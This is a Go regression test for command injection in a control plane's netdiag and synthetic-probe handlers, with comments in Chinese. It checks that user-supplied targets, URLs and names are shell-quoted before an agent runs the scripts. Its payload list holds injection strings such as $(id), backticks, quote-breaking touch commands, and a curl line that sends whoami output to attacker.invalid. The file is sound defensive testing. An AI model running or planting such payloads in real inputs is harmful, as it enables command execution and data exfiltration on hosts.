package controlplane

// probe_injection_test.go — 批次 7（探测/诊断面「req.* 未转义直插」收口）的注入守卫。
//
// 覆盖范围：internal/controlplane/netdiag_ops.go（8 处）+ synthetic_ops.go（5 处）。
//
// 为什么是真缺陷面：这两条 handler 把用户可控字段（target / url / name）裸拼进要下发
// 到 agent 的 shell 脚本，agent 以 `sh -c` 执行（internal/agent/agent.go 的 shellCommand）。
// 裸拼 ⇒ `$(id)` / 反引号被**真实执行**。注意**双引号段不是防护**：POSIX 双引号内
// `$` 与反引号同样会展开，`"$(id)"` 一样会被执行——所以旧形态里那两处 curl 的
// `"%s"` 并不比裸拼安全。
//
// 判据（逐条）：
//
//	① 载荷在脚本里**只能**以单引号字面量形态出现：脚本中「单引号之外」的文本不得含载荷、
//	  不得含 `$(`、不得含反引号、不得含注入的命令分隔与副作用命令；
//	② 不得残留旧式的双引号直插形态（`"$(id)"` 之类）；
//	③ 若本机有 sh：把脚本交给**真 sh** 执行一遍，注入载荷不得产生任何副作用
//	  （不落地标记文件）——这是语义级证明，不只是文本比对。
//	  CI 的 ubuntu runner 有 sh ⇒ 该判据在 CI 真跑；Windows 本机无 sh 时跳过
//	  （语义等价性另由 WSL2 手测复核，见板面）。
//	④ 源码级兜底：两个文件里不得再有「script = fmt.Sprintf(..., req.*, ...)」形态
//	  （即：用户字段不经 shellquote.Quote 就进脚本）。

import (
	"context"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// probePayloads 是本批的注入载荷集：命令替换（两种语法）、分号串联、
// 引号闭合（单/双引号各一）。
var probePayloads = []string{
	`$(id)`,
	"`id`",
	`x'; touch /tmp/opsmesh-probe-pwned; echo '`,
	`"; touch /tmp/opsmesh-probe-pwned; echo "`,
	`1.2.3.4; curl http://attacker.invalid/$(whoami)`,
}

// unquotedText 返回脚本中**不在单引号字面量内**的文本。
//
// POSIX 单引号语义：单引号内一切为字面量；唯一的转义法是关闭-转义-重开
// （' → '\”），故外层看到 `'` 切换状态、外层看到 `\'` 时该引号是字面量
// （不切换状态）。据此抽出「引号外文本」——注入载荷若出现在这里，就是可执行结构。
func unquotedText(script string) string {
	var b strings.Builder
	inQuote := false
	for i := 0; i < len(script); i++ {
		c := script[i]
		if inQuote {
			if c == '\'' {
				inQuote = false
			}
			continue
		}
		switch c {
		case '\'':
			inQuote = true
		case '\\':
			b.WriteByte(c)
			if i+1 < len(script) {
				i++
				b.WriteByte(script[i])
			}
		default:
			b.WriteByte(c)
		}
	}
	return b.String()
}

// assertNoInjection 断言脚本里载荷只以字面量形态存在（判据 ①②）。
func assertNoInjection(t *testing.T, name, script string, payload string) {
	t.Helper()
	out := unquotedText(script)
	for _, bad := range []string{payload, "$(", "`", "touch /tmp/opsmesh-probe-pwned"} {
		if bad == "" {
			continue
		}
		if strings.Contains(out, bad) {
			t.Errorf("%s：引号外文本含可执行结构 %q：\n脚本=%s\n引号外=%s", name, bad, script, out)
		}
	}
	// 旧形态：双引号直插（双引号内 $ / 反引号仍会展开，故不是防护）。
	if strings.Contains(script, `"`+payload+`"`) {
		t.Errorf("%s：仍是双引号直插形态：\n%s", name, script)
	}
}

// TestProbeInjection_NetDiag 覆盖 netdiag_ops.go 的 8 处（target 直插）。
func TestProbeInjection_NetDiag(t *testing.T) {
	s := newShellQuoteServer()
	actions := []string{"tcpdump", "mtr", "nmap", "dig", "host", "traceroute", "ping", "status-code"}
	for _, action := range actions {
		for i, payload := range probePayloads {
			dev := "probe-netdiag-" + action + "-" + string(rune('a'+i))
			rec := sqPost(t, s, s.handleNetDiag, map[string]interface{}{
				"deviceID": dev, "action": action, "target": payload,
			})
			if rec.Code != http.StatusAccepted {
				t.Fatalf("%s/%s 应受理：%d %s", action, payload, rec.Code, rec.Body.String())
			}
			sc := sqDispatchScript(t, s, dev)
			assertNoInjection(t, "netdiag/"+action+"/"+payload, sc, payload)
		}
	}
}

// TestProbeInjection_Synthetic 覆盖 synthetic_ops.go 的 5 处
// （create 的 name+url、delete 的 name、http/tcp/icmp 三种探针的 url）。
func TestProbeInjection_Synthetic(t *testing.T) {
	s := newShellQuoteServer()
	cases := []struct {
		name string
		body map[string]interface{}
	}{
		{"create", map[string]interface{}{"deviceID": "probe-syn-create", "action": "create", "name": "n", "url": "u"}},
		{"delete", map[string]interface{}{"deviceID": "probe-syn-delete", "action": "delete", "name": "n"}},
		{"run-http", map[string]interface{}{"deviceID": "probe-syn-http", "action": "run", "type": "http", "url": "u"}},
		{"run-tcp", map[string]interface{}{"deviceID": "probe-syn-tcp", "action": "run", "type": "tcp", "url": "u"}},
		{"run-icmp", map[string]interface{}{"deviceID": "probe-syn-icmp", "action": "run", "type": "icmp", "url": "u"}},
	}
	for _, c := range cases {
		for pi, payload := range probePayloads {
			body := map[string]interface{}{}
			for k, v := range c.body {
				body[k] = v
			}
			if _, ok := body["url"]; ok {
				body["url"] = payload
			}
			if _, ok := body["name"]; ok {
				body["name"] = payload
			}
			dev := body["deviceID"].(string) + "-" + string(rune('a'+pi))
			body["deviceID"] = dev
			rec := sqPost(t, s, s.handleSynthetic, body)
			if rec.Code != http.StatusAccepted {
				t.Fatalf("%s/%s 应受理：%d %s", c.name, payload, rec.Code, rec.Body.String())
			}
			sc := sqDispatchScript(t, s, dev)
			assertNoInjection(t, "synthetic/"+c.name+"/"+payload, sc, payload)
		}
	}
}

// TestProbeInjection_SyntheticTCPNoInnerReparse 钉 tcp 探针的**内层不二次解析**：
//
//	目标必须作为 bash 的 argv 传入（`bash -c '...' _ <target>`），不得内嵌进
//	`bash -c` 的命令串里——外层单引号只保护外层 sh，内层 bash 会把 `;` 当命令
//	分隔符重新执行（旧形态 `bash -c "echo > /dev/tcp/%s/%s"` 正是如此）。
func TestProbeInjection_SyntheticTCPNoInnerReparse(t *testing.T) {
	s := newShellQuoteServer()
	payload := `x'; touch /tmp/opsmesh-probe-pwned; echo '`
	rec := sqPost(t, s, s.handleSynthetic, map[string]interface{}{
		"deviceID": "probe-syn-tcp-shape", "action": "run", "type": "tcp", "url": payload,
	})
	if rec.Code != http.StatusAccepted {
		t.Fatalf("应受理：%d %s", rec.Code, rec.Body.String())
	}
	sc := sqDispatchScript(t, s, "probe-syn-tcp-shape")
	if !strings.Contains(sc, `bash -c 'echo > /dev/tcp/"$1"/80' _ `) {
		t.Fatalf("tcp 探针未走位置参数形态：\n%s", sc)
	}
	if strings.Contains(sc, `bash -c "`) {
		t.Fatalf("tcp 探针仍是内层双引号命令串形态（会被内层 bash 二次解析）：\n%s", sc)
	}
}

// TestProbeInjection_NoRawReqInterpolation 源码级兜底（判据 ④）：
// 两个文件里不得再有「script = fmt.Sprintf(..., req.*, ...)」形态。
func TestProbeInjection_NoRawReqInterpolation(t *testing.T) {
	for _, f := range []string{"netdiag_ops.go", "synthetic_ops.go"} {
		body, err := os.ReadFile(f)
		if err != nil {
			t.Fatalf("读取 %s 失败：%v", f, err)
		}
		for i, line := range strings.Split(string(body), "\n") {
			if !strings.Contains(line, "script") || !strings.Contains(line, "fmt.Sprintf") {
				continue
			}
			if !strings.Contains(line, "req.") {
				continue
			}
			if strings.Contains(line, "shellquote.Quote") {
				continue
			}
			t.Errorf("%s:%d 用户字段未经 shellquote.Quote 直插脚本：%s", f, i+1, strings.TrimSpace(line))
		}
	}
}

// TestProbeInjection_SemanticNoSideEffect 判据 ③：把脚本交给**真 sh** 执行，
// 注入载荷不得产生任何副作用（标记文件不得落地）。
//
// 只取快失败的动作（host / status-code / ping / curl），避免 tcpdump/mtr 之类
// 在有该工具的机器上长时间运行。
func TestProbeInjection_SemanticNoSideEffect(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("本机无 sh（Windows），语义判据由 CI 的 ubuntu runner 与 WSL2 手测承担")
	}
	dir := t.TempDir()
	marker := filepath.Join(dir, "pwned")
	if strings.ContainsAny(marker, " \t") {
		t.Skip("临时目录路径含空白，跳过语义判据")
	}
	// 标记路径转 POSIX 斜杠：Windows 路径里的反斜杠在 shell 里是转义符
	// （`touch C:\Users\x` 会变成 `touch C:Usersx`），不转则注入即便生效也打不到标记。
	//
	// 载荷形态说明：这里**不用**带引号闭合的载荷（如 `x'; touch …; echo '`）——
	// 那类载荷会让整段脚本变成**语法错误**（单引号未闭合 ⇒ sh 拒绝解析整条命令
	// 列表 ⇒ 一条都不执行），是 fail-closed，不构成可执行注入的证明。
	// 本载荷语法合法：旧形态下 `host x; touch …; echo y` 会真的执行 touch。
	payload := "x; touch " + filepath.ToSlash(marker) + "; echo y"

	s := newShellQuoteServer()
	plan := []struct {
		name    string
		handler http.HandlerFunc
		body    map[string]interface{}
		dev     string
	}{
		{"netdiag-host", s.handleNetDiag, map[string]interface{}{"action": "host", "target": payload}, "probe-sem-host"},
		{"netdiag-status-code", s.handleNetDiag, map[string]interface{}{"action": "status-code", "target": payload}, "probe-sem-status"},
		{"synthetic-icmp", s.handleSynthetic, map[string]interface{}{"action": "run", "type": "icmp", "url": payload}, "probe-sem-icmp"},
		{"synthetic-http", s.handleSynthetic, map[string]interface{}{"action": "run", "type": "http", "url": payload}, "probe-sem-http"},
	}
	for _, c := range plan {
		body := map[string]interface{}{"deviceID": c.dev}
		for k, v := range c.body {
			body[k] = v
		}
		rec := sqPost(t, s, c.handler, body)
		if rec.Code != http.StatusAccepted {
			t.Fatalf("%s 应受理：%d %s", c.name, rec.Code, rec.Body.String())
		}
		sc := sqDispatchScript(t, s, c.dev)
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		cmd := exec.CommandContext(ctx, sh, "-c", sc)
		cmd.Run() // 退出码无关紧要（工具多半不存在）；只看副作用
		cancel()
		if _, err := os.Stat(marker); err == nil {
			t.Fatalf("%s：注入载荷被执行（标记文件已落地）：\n%s", c.name, sc)
		}
	}
}
